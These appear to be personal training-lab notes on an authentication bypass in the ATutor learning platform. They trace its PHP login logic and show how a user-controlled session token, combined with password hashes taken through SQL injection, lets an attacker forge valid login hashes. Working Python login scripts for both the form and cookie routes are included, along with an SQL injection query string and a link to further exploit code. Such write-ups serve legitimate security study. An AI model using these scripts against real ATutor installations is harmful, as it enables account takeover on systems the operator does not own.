# Authentication Bypass

We investigate the login process: 

- Can try to obtain password hashes and use hashes to bypass checks.
- Investigate login process to identify weaknesses.

## Login Process

- When we send login request, it passes the attribute `form_password_hidden` that seems to be a hash of the password.

![Untitled](Authentication%20Bypass%20f09f893acb8d4b41953ccfb36ed59dc6/Untitled.png)

- Login process:
    - This means that if set, the `token` field of the POST request can be used to set the Session’s token field.

```php
In login.php, we find:
include(AT_INCLUDE_PATH.'login_functions.inc.php');

Tracing this to login_functions.inc.php, we get:
if (isset($_POST['token'])){    
		$_SESSION['token'] = $_POST['token'];
}else{    
		if (!isset($_SESSION['token']))        
		$_SESSION['token'] = sha1(mt_rand() . microtime(TRUE));
}
```

When we follow the logic path, we get to the following query: 

```jsx
$row = queryDB("SELECT member_id, login, first_name, second_name, last_name, preferences, language, status, password AS pass, last_login FROM %smembers WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, '%s'))='%s'", array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], $this_password), TRUE);

Vulnerable logic: AND SHA1(CONCAT(password, $_SESSION['token']))=$this_password;

Tracing the variables:
$_SESSION['token'] can be overwritten by $_POST['token']

$this_password is the value submitted as $_POST['form_password_hidden']
else if (isset($_POST['submit'])) {
    /* form post login */
    $this_password = $_POST['form_password_hidden'];
    $this_login        = $_POST['form_login'];
    $auto_login        = isset($_POST['auto']) ? intval($_POST['auto']) : 0;
    $used_cookie    = false;
}

password is the SQL query, the attribute password in the table. 
```

- This means that if we can obtain the password attribute from the database (with SQLi), we will be able to calculate the correct value that `$this_password` should take by performing `SHA1(CONCAT(password, $_SESSION['token']))` with the session token that we inject.
- We can also confirm this process by checking the front-end code (in `./themes/simplified_desktop/login.tmpl.php` )

```php
function encrypt_password() {
        document.form.form_password_hidden.value = hex_sha1(hex_sha1(document.form.form_password.value) + "<?php ec
ho $_SESSION['token']; ?>");
        document.form.form_password.value = "";
        return true;
}
```

## Hash Calculation

- With the password secret, we can follow the hashing/authentication process to calculate the hash to pass into the application.

```python
def login(ip, username, user_hash):
    target = f"http://{ip}//ATutor/login.php"
    token = "token"
    hashed = hashlib.sha1((user_hash + token).encode('utf-8'))

    data = {
        "submit": "Login",
        "form_login": username,
        "form_password_hidden": hashed.hexdigest(),
        "token":token
    }
    s = requests.Session()
    r = s.post(target, data=data)
    res = r.text
    
    if re.search("Invalid login/password combination.",res):
        return False
    return True
```

## Extra Mile Exercise

- Refer to exploit code for [exercise 3.7](https://github.com/dvdg6566/oswe/blob/main/labs/atutor/extra_mile_3.7.py)
- We can also use cookies to bypass the authentication process. The salted password is compared against

Application interaction with provided parameters: 

- If there is a cookie defined, then `this_login` and `this_password` are defined based on cookie attributes `ATLogin` and `ATPass`

```php
if (!$msg->containsFeedbacks()) {
    if (isset($_COOKIE['ATLogin'])) {
        $cookie_login = $_COOKIE['ATLogin'];
    }
    if (isset($_COOKIE['ATPass'])) {
        $cookie_pass  = $_COOKIE['ATPass'];
    }
}

if (isset($cookie_login, $cookie_pass) && !isset($_POST['submit'])) {
    /* auto login */
    $this_login        = $cookie_login;
    $this_password    = $cookie_pass;
    $auto_login        = 1;
    $used_cookie    = true;
}
```

### Auth Query

- The salted password is defined based on the sha512 hash of the hashed password concatenated with the sha512 hash of the last login element. As such, we use our SQLi to get both these attributes.
    - Alternatively, GET requests contain the sha512 hash of the last login. This login is used by the front-end to generate the `$this_password` attribute, and we can use this to directly calculate salted password hash.

```php
if ($used_cookie) {
    #4775: password now store with salt
    $rows = queryDB("SELECT password, last_login FROM %smembers WHERE login='%s'", array(TABLE_PREFIX, $this_lo
gin), TRUE);
    $cookieRow = $rows;
    $saltedPassword = hash('sha512', $cookieRow['password'] . hash('sha512', $cookieRow['last_login']));
    $row = queryDB("SELECT member_id, login, first_name, second_name, last_name, preferences,password AS pass,
language, status, last_login FROM %smembers WHERE login='%s' AND '%s'='%s'", array(TABLE_PREFIX, $this_login, $salt
edPassword, $this_password), TRUE);
}
```

- SQL Injection to get the last_login field.

```bash
Query String: "select/**/last_login/**/FROM/**/AT_members/**/WHERE/**/login=\"{member_username}\""
Result: 2023-11-30 09:59:20
```

- Login HTTP Request

```python
def login(ip, username, user_hash, user_lastlogin):
    target = f"http://{ip}//ATutor/login.php"

    lastlogin_hash = hashlib.sha512((user_lastlogin).encode('utf-8')).hexdigest()
    hashed = hashlib.sha512((user_hash +  lastlogin_hash).encode('utf-8')).hexdigest() 

    cookies = {
        'ATLogin': username,
        'ATPass': hashed
    }

    s = requests.Session()
    r = s.post(target, cookies=cookies)
    res = r.text

    if re.search("Invalid login/password combination.",res):
        return False
    return True
```